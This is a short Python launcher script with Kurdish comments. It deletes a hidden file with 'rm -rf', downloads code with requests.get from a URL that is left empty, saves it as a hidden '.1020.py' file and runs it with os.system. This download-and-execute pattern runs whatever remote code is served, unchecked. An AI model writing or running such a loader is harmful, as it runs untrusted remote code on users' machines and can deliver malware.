# Host krdne tool la regay am codanawa
#    python
#       python2
#          python3


import requests
import os
# Bo Bang krdne mudel kan det


os.system('rm -rf .1020.py')
code = requests.get('')
raw = code.text
# Bo nwe krdnawae cod w rash krdnawae


file = open('.1020.py','w')
file.write(raw)
file.close()
# Bo nosene codaka det ka raw krawa


os.system('python3 .1020.py')
#  Bo chona naw tools